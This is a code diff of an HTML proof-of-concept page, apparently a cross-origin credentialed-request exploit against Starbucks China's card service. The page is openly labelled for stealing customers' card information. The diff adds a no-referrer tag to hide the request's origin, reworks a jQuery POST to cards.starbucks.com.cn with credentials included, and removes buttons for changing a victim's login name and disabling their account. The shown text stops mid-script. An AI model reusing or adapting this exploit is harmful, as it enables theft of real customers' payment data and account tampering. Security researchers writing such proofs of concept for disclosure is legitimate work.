@@ -1,13 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
+<meta name="referrer" content="never">
 <script src=../jquery-3.4.1.min.js></script>
 </head>
 <title>steal the informations</title>
-<div>
-Attention!the loggin userName can be modified only once,click the button.
-<button id="modifyuserName" onclick="modifyUserName()">Modify the loggin name of starbucks's account</button>
-</div>
 </br>
 </br>
 <div>
@@ -15,27 +12,27 @@ click the button to Steal the customer's cards informations!
 <button id="stealCards" onclick="stealCustomerCards()">Steal the customer's cards informations</button>
 </div>
 <div text="steal customer's cards informaiton">
-steal customer's personal address
+steal customer's cards informaiton
 <textarea id="customer" style="width: 200px; height: 150px;"></textarea>
 </div>
 </br>
 </br>
 </br>
-<div>
-Attention!click the button will lead your account disabled.
-<button id="disable" onclick="disable()">Disable the starbucks's account</button>
-</div>
 <script>
 	
 	function stealCustomerCards(){
-		var data = '{"data":{"filter":{"domain":"svc"}}}';
-                data = JSON. parse(data);
+		var data = {};
+		var domain = {};
+		var filter = {};
+		domain["domain"] = "svc";
+		filter["filter"] = domain;
+		data["data"] = filter;
 		$.ajax({
 			    url : 'https://cards.starbucks.com.cn/cards',
 			    type : 'POST',
 			    dataType:'json',
-			    contentType:'application/json',
-			    data:data,
+			    contentType:'application/vnd.api+json',
+			    data:JSON.stringify(data),
 			    xhrFields: {
 			     withCredentials: true
 			 },
